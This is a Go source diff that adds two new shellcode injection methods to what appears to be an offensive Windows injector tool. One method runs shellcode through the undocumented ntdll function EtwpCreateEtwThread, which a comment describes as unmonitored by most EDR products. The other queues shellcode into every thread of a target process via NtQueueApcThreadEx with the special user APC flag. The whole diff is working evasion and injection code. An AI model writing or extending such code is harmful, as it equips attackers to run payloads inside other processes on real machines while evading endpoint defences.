@@ -100,6 +100,10 @@ func (w *windowsInjector) Inject(shellcode []byte) error {
 		return w.injectDirectSyscall(shellcode)
 	case MethodCreateFiber:
 		return w.injectCreateFiber(shellcode)
+	case MethodEtwpCreateEtwThread:
+		return w.injectEtwpCreateEtwThread(shellcode)
+	case MethodNtQueueApcThreadEx:
+		return w.injectNtQueueApcThreadEx(shellcode)
 	default:
 		return fmt.Errorf("unknown injection method: %s", w.config.Method)
 	}
@@ -492,6 +496,120 @@ func (w *windowsInjector) injectCreateFiber(shellcode []byte) error {
 
 	// 4. Switch to shellcode Fiber (execution!)
 	api.ProcSwitchToFiber.Call(shellcodeFiber)
+
+	return nil
+}
+
+// --- Method 9: EtwpCreateEtwThread ---
+
+// injectEtwpCreateEtwThread abuses the internal ntdll function EtwpCreateEtwThread
+// to create a thread. This function is not monitored by most EDR products
+// because it's an internal ETW mechanism, not a standard thread creation API.
+func (w *windowsInjector) injectEtwpCreateEtwThread(shellcode []byte) error {
+	if err := validateShellcode(shellcode); err != nil {
+		return err
+	}
+
+	// 1. Allocate RW memory
+	addr, err := windows.VirtualAlloc(0, uintptr(len(shellcode)),
+		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil {
+		return fmt.Errorf("VirtualAlloc: %w", err)
+	}
+
+	// 2. Copy shellcode
+	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode)), shellcode)
+
+	// 3. Change to RX
+	var oldProtect uint32
+	if err := windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
+		return fmt.Errorf("VirtualProtect: %w", err)
+	}
+
+	// 4. Call EtwpCreateEtwThread(addr, 0) — creates a thread running at addr
+	proc := windows.NewLazySystemDLL("ntdll.dll").NewProc("EtwpCreateEtwThread")
+	r, _, _ := proc.Call(addr, 0)
+	if r == 0 {
+		return fmt.Errorf("EtwpCreateEtwThread failed")
+	}
+
+	return nil
+}
+
+// --- Method 10: NtQueueApcThreadEx ---
+
+// injectNtQueueApcThreadEx uses NtQueueApcThreadEx with the special user APC flag
+// (QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC = 1) available on Windows 10 1903+.
+// Unlike standard APC injection, this forces APC delivery without requiring
+// the target thread to be in an alertable wait state.
+func (w *windowsInjector) injectNtQueueApcThreadEx(shellcode []byte) error {
+	if err := validateShellcode(shellcode); err != nil {
+		return err
+	}
+	if w.config.PID == 0 {
+		return fmt.Errorf("PID required for NtQueueApcThreadEx")
+	}
+
+	hProcess, err := windows.OpenProcess(
+		windows.PROCESS_VM_OPERATION|
+			windows.PROCESS_VM_WRITE|
+			windows.PROCESS_VM_READ,
+		false,
+		uint32(w.config.PID),
+	)
+	if err != nil {
+		return fmt.Errorf("OpenProcess failed: %w", err)
+	}
+	defer windows.CloseHandle(hProcess)
+
+	addr, err := allocateAndWriteMemoryRemote(hProcess, shellcode)
+	if err != nil {
+		return fmt.Errorf("remote memory setup failed: %w", err)
+	}
+
+	// Find all threads of the target process
+	threadIDs, err := findAllThreads(w.config.PID)
+	if err != nil {
+		return fmt.Errorf("failed to find threads: %w", err)
+	}
+	if len(threadIDs) == 0 {
+		return fmt.Errorf("no threads found for PID %d", w.config.PID)
+	}
+
+	// NtQueueApcThreadEx with QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC (flag=1)
+	// forces delivery without alertable wait
+	procNtQueueApcThreadEx := windows.NewLazySystemDLL("ntdll.dll").NewProc("NtQueueApcThreadEx")
+
+	success := false
+	for _, threadID := range threadIDs {
+		hThread, openErr := windows.OpenThread(
+			windows.THREAD_SET_CONTEXT,
+			false,
+			threadID,
+		)
+		if openErr != nil {
+			continue
+		}
+
+		// NtQueueApcThreadEx(ThreadHandle, UserApcReserveHandle|Flags, ApcRoutine, Arg1, Arg2, Arg3)
+		// Flag 1 = QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
+		status, _, _ := procNtQueueApcThreadEx.Call(
+			uintptr(hThread),
+			1, // QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
+			addr,
+			0, 0, 0,
+		)
+		windows.CloseHandle(hThread)
+
+		if status == 0 { // STATUS_SUCCESS
+			success = true
+			break
+		}
+	}
+
+	if !success {
+		return fmt.Errorf("NtQueueApcThreadEx failed on all threads")
+	}
 
 	return nil
 }
